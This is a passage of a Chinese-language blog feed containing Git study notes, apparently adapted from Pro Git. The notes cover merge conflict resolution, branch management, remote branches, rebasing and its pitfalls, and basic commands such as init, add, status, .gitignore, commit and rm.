class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git merge iss53</span></span><br><span class="line">Auto-merging index.html</span><br><span class="line">CONFLICT (content): Merge conflict in index.html</span><br><span class="line">Automatic merge failed; fix conflicts and then commit the result.</span><br></pre></td></tr></table></figure><p>可以使用<code>git status</code>查看当前产生冲突而未合并状态的文件</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">You have unmerged paths.</span><br><span class="line">  (fix conflicts and run &quot;git commit&quot;)</span><br><span class="line"></span><br><span class="line">Unmerged paths:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to mark resolution)</span><br><span class="line"></span><br><span class="line">    both modified:      index.html</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure></li><li><p>任何因包含合并冲突而有待解决的文件，都会以未合并状态标识出来。 Git 会在有冲突的文件中加入标准的冲突解决标记，这样你可以打开这些包含冲突的文件然后手动解决冲突。 出现冲突的文件会包含一些特殊区段，看起来像下面这个样子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD:index.html</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>contact : email.support@github.com<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">=======</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line"> please contact us at support@github.com</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt; iss53:index.html</span><br></pre></td></tr></table></figure><p>这表示 <code>HEAD</code> 所指示的版本（也就是你的 <code>master</code> 分支所在的位置，因为你在运行 merge 命令的时候已经检出到了这个分支）在这个区段的上半部分（<code>=======</code> 的上半部分），而 <code>iss53</code> 分支所指示的版本在 <code>=======</code> 的下半部分。 为了解决冲突，你必须选择使用由 <code>=======</code> 分割的两部分中的一个，或者你也可以自行合并这些内容。 例如，你可以通过把这段内容换成下面的样子来解决冲突：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;footer&quot;</span>&gt;</span></span><br><span class="line">please contact us at email.support@github.com</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>手动合并完成后，对冲突文件使用<code>git add</code>将其标记为冲突已解决。</p></li><li><p>如果想使用图形化界面来处理冲突操作，可以使用<code> git mergetool</code>，该命令会为你启动一个合适的可视化合并工具，并带领你一步一步解决这些冲突。退出工具后，Git 会询问刚才的合并是否成功。 如果你回答是，Git 会暂存那些文件以表明冲突已解决： 你可以再次运行 <code>git status</code> 来确认所有的合并冲突都已被解决。</p></li></ul><h2 id="分支管理">分支管理</h2><ul><li><p>使用不带参数的<code>git branch</code>命令可以查看当前分支的列表：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch</span></span><br><span class="line">  iss53</span><br><span class="line">* master</span><br><span class="line">  testing</span><br></pre></td></tr></table></figure><p>其中，带有<code>*</code>的master分支代表当前HEAD指针所指向的分支。</p></li><li><p>如果需要查看每一个分支的最后一次提交，可以使用<code>git branch -v</code>命令：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -v</span></span><br><span class="line">  iss53   93b412c fix javascript issue</span><br><span class="line">* master  7a98805 Merge branch &#x27;iss53&#x27;</span><br><span class="line">  testing 782fd34 add scott to the author list in the readmes</span><br></pre></td></tr></table></figure></li><li><p>还可以使用<code>--merged</code>与<code>--no-merged</code>筛选当前已合并或未合并到当前分支的分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch --merged</span></span><br><span class="line">  iss53</span><br><span class="line">* master</span><br></pre></td></tr></table></figure></li><li><p>可以使用<code>git branch -d</code>删除分支，如果删除分支包含了还未合并的工作，则会删除失败：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git branch -d testing</span></span><br><span class="line">error: The branch &#x27;testing&#x27; is not fully merged.</span><br><span class="line">If you are sure you want to delete it, run &#x27;git branch -D testing&#x27;.</span><br></pre></td></tr></table></figure><p>可以使用<code>-D</code>完成强制删除。</p></li></ul><h2 id="远程分支">远程分支</h2><ul><li><p>假设有一个在 <code>git.ourcompany.com</code> 的 Git 服务器。 如果从这里克隆，Git 的 <code>clone</code> 命令会为你自动将其命名为 <code>origin</code>，拉取它的所有数据， 创建一个指向它的 <code>master</code> 分支的指针，并且在本地将其命名为 <code>origin/master</code>。 Git 也会给你一个与 origin 的 <code>master</code> 分支在指向同一个地方的本地 <code>master</code> 分支。</p><p><img src="https://git-scm.com/book/en/v2/images/remote-branches-1.png" alt="克隆之后的服务器与本地仓库。"></p></li><li><p>如果在本地的 <code>master</code> 分支做了一些工作，在同一段时间内有其他人推送提交到 <code>git.ourcompany.com</code> 并且更新了它的 <code>master</code> 分支，这就是说你们的提交历史已走向不同的方向。 即便这样，只要你保持不与 <code>origin</code> 服务器连接（并拉取数据），你的 <code>origin/master</code> 指针就不会移动。</p><p><img src="https://git-scm.com/book/en/v2/images/remote-branches-2.png" alt="本地与远程的工作可以分叉。"></p></li><li><p>如果要与远程仓库同步数据，运行 <code>git fetch &lt;remote&gt;</code> 命令（本例中为 <code>git fetch origin</code>）。 这个命令查找 ``origin’’ 是哪一个服务器（在本例中，它是 <code>git.ourcompany.com</code>）， 从中抓取本地没有的数据，并且更新本地数据库，移动 <code>origin/master</code> 指针到更新之后的位置。</p><p><img src="https://git-scm.com/book/en/v2/images/remote-branches-3.png" alt=" 更新你的远程仓库引用。"></p></li></ul><h2 id="变基">变基</h2><h3 id="变基的使用">变基的使用</h3><ul><li><p>在 Git 中整合来自不同分支的修改主要有两种方法：<code>merge</code> 以及 <code>rebase</code>。假设现在有两个分支分别提交了更新</p><p><img src="https://git-scm.com/book/en/v2/images/basic-rebase-1.png" alt="分叉的提交历史。"></p></li><li><p>如果使用<code>merge</code>合并两个分支，那么会产生一次新的快照。</p><p><img src="https://git-scm.com/book/en/v2/images/basic-rebase-2.png" alt="通过合并操作来整合分叉了的历史。"></p></li><li><p>使用另一种方法：提取C4中引入的补丁和修改，然后再C3的基础上应用一次，这种操作称为<strong>变基（rebase）</strong>。比如，检出experiment分支，将其变基到master分支上：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git checkout experiment</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git rebase master</span></span><br><span class="line">First, rewinding head to replay your work on top of it...</span><br><span class="line">Applying: added staged command</span><br></pre></td></tr></table></figure><p>它的原理是首先找到这两个分支（即当前分支 <code>experiment</code>、变基操作的目标基底分支 <code>master</code>） 的最近共同祖先 <code>C2</code>，然后对比当前分支相对于该祖先的历次提交，提取相应的修改并存为临时文件， 然后将当前分支指向目标基底 <code>C3</code>, 最后以此将之前另存为临时文件的修改依序应用。</p><p><img src="https://git-scm.com/book/en/v2/images/basic-rebase-3.png" alt="将  中的修改变基到  上。"></p></li><li><p>现在回到master分支上，进行一次快进合并：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge experiment</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/basic-rebase-4.png" alt=" 分支的快进合并。"></p><p>此时的C4’快照就和使用merge合并产生的C5快照一模一样了。这两种整合方法的最终结果没有任何区别，但是变基使得提交历史更加整洁。 你在查看一个经过变基的分支的历史记录时会发现，尽管实际的开发工作是并行的， 但它们看上去就像是串行的一样，提交历史是一条直线没有分叉。例如向某个其他人维护的项目贡献代码时，首先在自己的分支里进行开发，当开发完成时你需要先将你的代码变基到 <code>origin/master</code> 上，然后再向主项目提交修改。 这样的话，该项目的维护者就不再需要进行整合工作，只需要快进合并便可。</p></li><li><p>对于一个主题分支中再分出一个主题分支的提交，如下图结构</p><p><img src="https://git-scm.com/book/en/v2/images/interesting-rebase-1.png" alt="从一个主题分支里再分出一个主题分支的提交历史。"></p><p>如果希望合并client到master分支，但不希望将server分支合并，此时就可以使用<code>--onto</code>选项，选中在 <code>client</code> 分支里但不在 <code>server</code> 分支里的修改（即 <code>C8</code> 和 <code>C9</code>），将它们在 <code>master</code> 分支上重放：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase --onto master server client</span><br></pre></td></tr></table></figure><p>这条语句的意思是：取出 <code>client</code> 分支，找出它从 <code>server</code> 分支分歧之后的补丁， 然后把这些补丁在 <code>master</code> 分支上重放一遍，让 <code>client</code> 看起来像直接基于 <code>master</code> 修改一样。</p><p><img src="https://git-scm.com/book/en/v2/images/interesting-rebase-2.png" alt="截取主题分支上的另一个主题分支，然后变基到其他分支。"></p></li><li><p>那么现在可以使用快进合并合并master分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge client</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/interesting-rebase-3.png" alt="快进合并  分支，使之包含来自  分支的修改。"></p></li><li><p>如果现在需要将server分支也合并进来，使用变基操作，完成合并，然后删除多余的分支：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout master</span><br><span class="line">git merge server</span><br><span class="line">git branch -d client</span><br><span class="line">git branch -d server</span><br></pre></td></tr></table></figure><p><img src="https://git-scm.com/book/en/v2/images/interesting-rebase-5.png" alt="最终的提交历史。"></p></li></ul><h3 id="变基的问题">变基的问题</h3><ul><li><p>如果当别人正在基于分支进行开发，那么不应该将分支使用变基合并到主分支上。变基操作的实质是丢弃一些现有的提交，然后相应地新建一些内容一样但实际上不同的提交。 如果你已经将提交推送至某个仓库，而其他人也已经从该仓库拉取提交并进行了后续工作，此时，如果你用 <code>git rebase</code> 命令重新整理了提交并再次推送，你的同伴因此将不得不再次将他们手头的工作与你的提交进行整合，如果接下来你还要拉取并整合他们修改过的提交，事情就会变得一团糟。</p></li><li><p>比如，现在有一个公开仓库，你从当前仓库克隆到本地并在此基础上进行开发。</p><p><img src="https://git-scm.com/book/en/v2/images/perils-of-rebasing-1.png" alt="克隆一个仓库，然后在它的基础上进行了一些开发。"></p></li><li><p>然后，某人向该仓库提交了一些修改，其中还包括一次合并。你抓取了远程分支上的修改，然后合并到你的本地分支上。</p><p><img src="https://git-scm.com/book/en/v2/images/perils-of-rebasing-2.png" alt="抓取别人的提交，合并到自己的开发分支。"></p></li><li><p>接下来，这个开发者又决定将合并操作回滚，更换为使用变基合并，并使用<code>git push --force</code>命令覆盖了服务器上的提交历史。然后你向服务器抓取更新，会发现多出来一些新的提交。</p><p><img src="https://git-scm.com/book/en/v2/images/perils-of-rebasing-3.png" alt="有人推送了经过变基的提交，并丢弃了你的本地开发所基于的一些提交。"></p></li><li><p>此时，如果你执行<code>git pull</code>命令提交，就会将已经抛弃的C4和C6快照恢复，最终仓库会如下图所示，变得混乱。</p><p><img src="https://git-scm.com/book/en/v2/images/perils-of-rebasing-4.png" alt="你将相同的内容又合并了一次，生成了一个新的提交。"></p></li></ul><h3 id="解决因变基产生的合并问题">解决因变基产生的合并问题</h3><ul><li><p>假如真的遇到了类似的问题，可以使用一些操作解决。实际上，Git 除了对整个提交计算 SHA-1 校验和以外，也对本次提交所引入的修改计算了校验和——即 “patch-id”。如果你拉取被覆盖过的更新并将你手头的工作基于此进行变基的话，一般情况下 Git 都能成功分辨出哪些是你的修改，并把它们应用到新分支上。</p></li><li><p>这种情况下，如果并非执行合并，而是使用<code>git rebase teamone/master</code>，Git就会执行以下操作：</p><ul><li>检查哪些提交是我们的分支上独有的（C2，C3，C4，C6，C7）</li><li>检查其中哪些提交不是合并操作的结果（C2，C3，C4）</li><li>检查哪些提交在对方覆盖更新时并没有被纳入目标分支（只有 C2 和 C3，因为 C4 其实就是 C4’）</li><li>把查到的这些提交应用在 <code>teamone/master</code> 上面</li></ul><p>那么将会产生如下结构：</p><p><img src="https://git-scm.com/book/en/v2/images/perils-of-rebasing-5.png" alt="在一个被变基然后强制推送的分支上再次执行变基。"></p><p>不过，这种操作需要保证C4’和C4是一样的，否则变基操作将无法识别，并新建另一个类似C4的补丁。</p></li><li><p>还有另一种简单的方法是使用<code>git pull --rebase</code>，或者手动完成这个过程，先 <code>git fetch</code>，再 <code>git rebase teamone/master</code>。</p></li></ul><h2 id="Learn-Git-Branching">Learn Git Branching</h2><ul><li>在<a href="https://learngitbranching.js.org/?locale=zh_CN">Learn Git Branching</a>上，可以进行一部分git命令的教学实验，或者使用沙盒进行测试，通过具象化的图形可以帮助对Git操作的理解。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git的指令</title>
      <link href="/posts/cbbfdcc5.html"/>
      <url>/posts/cbbfdcc5.html</url>
      
        <content type="html"><![CDATA[<h2 id="创建Git仓库">创建Git仓库</h2><ul><li><p>在需要创建Git仓库的目录下打开Git Bash，使用<code>git init</code>命令来初始化一个Git仓库，在执行完<code>git init</code>命令后，该目录下会生成一个名为.git的隐藏目录，这个目录中包含了资源的所有元数据。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br></pre></td></tr></table></figure></li><li><p>也可以指定目录作为Git仓库</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git init /path/to/your/repo</span><br></pre></td></tr></table></figure></li></ul><h2 id="将文件纳入版本控制">将文件纳入版本控制</h2><h3 id="追踪文件">追踪文件</h3><ul><li><p>在Git仓库目录中，如果有几个文件需要纳入版本控制，需要先使用<code>git add</code>命令告诉Git这些文件需要被追踪。以下命令将README文件提交到仓库中。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add README</span><br></pre></td></tr></table></figure></li><li><p>然后使用<code>git status</code>命令查看当前Git状态，会看到README文件已被跟踪，并处于暂存状态。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with &#x27;origin/master&#x27;.</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git restore --staged &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">    new file:   README</span><br></pre></td></tr></table></figure></li><li><p>现在修改一个已经被跟踪的文件“<a href="http://CONTRIBUTING.md">CONTRIBUTING.md</a>”，然后运行<code>git status</code>命令，会看到如下内容：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with &#x27;origin/master&#x27;.</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">    new file:   README</span><br><span class="line"></span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">    modified:   CONTRIBUTING.md</span><br></pre></td></tr></table></figure></li><li><p>文件 <code>CONTRIBUTING.md</code> 出现在 <code>Changes not staged for commit</code> 这行下面，说明已跟踪文件的内容发生了变化，但还没有放到暂存区。 要暂存这次更新，需要运行 <code>git add</code> 命令：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add CONTRIBUTING.md</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with &#x27;origin/master&#x27;.</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">    new file:   README</span><br><span class="line">    modified:   CONTRIBUTING.md</span><br></pre></td></tr></table></figure></li><li><p>现在两个文件都已暂存，下次提交时就会一并记录到仓库。 假设此时，你想要在 <code>CONTRIBUTING.md</code> 里再加条注释。 重新编辑存盘后，准备好提交。 不过且慢，再运行 <code>git status</code> 看看：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">vim CONTRIBUTING.md</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with &#x27;origin/master&#x27;.</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">    new file:   README</span><br><span class="line">    modified:   CONTRIBUTING.md</span><br><span class="line"></span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">    modified:   CONTRIBUTING.md</span><br></pre></td></tr></table></figure></li><li><p>现在 <code>CONTRIBUTING.md</code> 文件同时出现在暂存区和非暂存区。实际上 Git 只暂存了运行 <code>git add</code> 命令时的版本。如果你现在提交，<code>CONTRIBUTING.md</code> 的版本是你最后一次运行 <code>git add</code> 命令时的那个版本，而不是你运行 <code>git commit</code> 时，在工作目录中的当前版本。 所以，运行了 <code>git add</code> 之后又作了修订的文件，需要重新运行 <code>git add</code> 把最新版本重新暂存起来：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git add CONTRIBUTING.md</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with &#x27;origin/master&#x27;.</span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use &quot;git reset HEAD &lt;file&gt;...&quot; to unstage)</span><br><span class="line"></span><br><span class="line">    new file:   README</span><br><span class="line">    modified:   CONTRIBUTING.md</span><br></pre></td></tr></table></figure></li></ul><h3 id="状态简览">状态简览</h3><ul><li><p><code>git status</code> 命令的输出十分详细，但其用语有些繁琐。 Git 有一个选项可以帮你缩短状态命令的输出，这样可以以简洁的方式查看更改。 如果你使用 <code>git status -s</code> 命令或 <code>git status --short</code> 命令，你将得到一种格式更为紧凑的输出。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status -s</span></span><br><span class="line"> M README</span><br><span class="line">MM Rakefile</span><br><span class="line">A  lib/git.rb</span><br><span class="line">M  lib/simplegit.rb</span><br><span class="line">?? LICENSE.txt</span><br></pre></td></tr></table></figure></li><li><p>新添加的未跟踪文件前面有 <code>??</code> 标记，新添加到暂存区中的文件前面有 <code>A</code> 标记，修改过的文件前面有 <code>M</code> 标记。 输出中有两栏，左栏指明了暂存区的状态，右栏指明了工作区的状态。例如，上面的状态报告显示： <code>README</code> 文件在工作区已修改但尚未暂存，而 <code>lib/simplegit.rb</code> 文件已修改且已暂存。 <code>Rakefile</code> 文件已修改，暂存后又作了修改，因此该文件的修改中既有已暂存的部分，又有未暂存的部分。</p></li></ul><h3 id="忽略文件">忽略文件</h3><ul><li><p>一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。 通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。 在这种情况下，我们可以创建一个名为 <code>.gitignore</code> 的文件，列出要忽略的文件的模式。 来看一个实际的 <code>.gitignore</code> 例子：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> .gitignore</span></span><br><span class="line">*.[oa]</span><br><span class="line">*~</span><br></pre></td></tr></table></figure></li><li><p>第一行告诉 Git 忽略所有以 <code>.o</code> 或 <code>.a</code> 结尾的文件。一般这类对象文件和存档文件都是编译过程中出现的。 第二行告诉 Git 忽略所有名字以波浪符（~）结尾的文件，许多文本编辑软件（比如 Emacs）都用这样的文件名保存副本。 此外，你可能还需要忽略 log，tmp 或者 pid 目录，以及自动生成的文档等等。 要养成一开始就为你的新仓库设置好 .gitignore 文件的习惯，以免将来误提交这类无用的文件。</p><blockquote><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 忽略所有的 .a 文件</span></span><br><span class="line">*<span class="string">.a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 但跟踪所有的 lib.a，即便你在前面忽略了 .a 文件</span></span><br><span class="line">!lib.a</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只忽略当前目录下的 TODO 文件，而不忽略 subdir/TODO</span></span><br><span class="line"><span class="string">/TODO</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略任何目录下名为 build 的文件夹</span></span><br><span class="line">build/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略 doc/notes.txt，但不忽略 doc/server/arch.txt</span></span><br><span class="line">doc/*<span class="string">.txt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 忽略 doc/ 目录及其所有子目录下的 .pdf 文件</span></span><br><span class="line">doc/**/*<span class="string">.pdf</span></span><br></pre></td></tr></table></figure><p>GitHub 有一个十分详细的针对数十种项目及语言的 <code>.gitignore</code> 文件列表， 你可以在 <a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a> 找到它。</p></blockquote></li></ul><h3 id="提交更新">提交更新</h3><ul><li><p>现在暂存区已经准备就绪，可以使用<code>git commit</code>提交了。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit</span><br></pre></td></tr></table></figure></li><li><p>然后会启动你选择的文本编辑器来输入提交说明。编辑器会显示类似下面的文本信息：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Please enter the commit message <span class="keyword">for</span> your changes. Lines starting</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">with <span class="string">&#x27;#&#x27;</span> will be ignored, and an empty message aborts the commit.</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">On branch master</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Your branch is up-to-date with <span class="string">&#x27;origin/master&#x27;</span>.</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Changes to be committed:</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">new file:   README</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">modified:   CONTRIBUTING.md</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">~</span></span><br><span class="line">~</span><br><span class="line">~</span><br><span class="line">&quot;.git/COMMIT_EDITMSG&quot; 9L, 283C</span><br></pre></td></tr></table></figure></li><li><p>可以看到，默认的提交消息包含最后一次运行 <code>git status</code> 的输出，放在注释行里，另外开头还有一个空行，供你输入提交说明。在Vim编辑器中，可以按下<kbd>i</kbd>或者<kbd>Insert</kbd>进入编辑模式。完成编辑后按下<kbd>Esc</kbd>，输入<code>:wq</code>保存并退出文件，如果需要放弃修改并退出，输入<code>:q!</code>。</p></li></ul><h3 id="移除文件">移除文件</h3><ul><li><p>要从 Git 中移除某个文件，就必须要从已跟踪文件清单中移除（确切地说，是从暂存区域移除），然后提交。 可以用 <code>git rm</code> 命令完成此项工作，并连带从工作目录中删除指定的文件，这样以后就不会出现在未跟踪文件清单中了：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">rm</span> PROJECTS.md</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git status</span></span><br><span class="line">On branch master</span><br><span class="line">Your branch is up-to-date with &#x27;origin/master&#x27;.</span><br><span class="line">Changes not staged for commit:</span><br><span class="line">  (use &quot;git add/rm &lt;file&gt;...&quot; to update what will be committed)</span><br><span class="line">  (use &quot;git checkout -- &lt;file&gt;...&quot; to discard changes in working directory)</span><br><span class="line"></span><br><span class="line">        deleted:    PROJECTS.md</span><br><span class="line"></span><br><span class="line">no changes added to commit (use &quot;git add&quot; and/or &quot;git commit -a&quot;)</span><br></pre></td></tr></table></figure></li><li><p>如果希望Git不再跟踪文件时，文件可以继续保留在磁盘上，使用<code>--cache</code>选项：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">rm</span> --cached README</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="重命名（移动文件）">重命名（移动文件）</h3><ul><li><p>如果需要在Git跟踪的文件中重命名某个文件，可以使用<code>git mv</code>：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 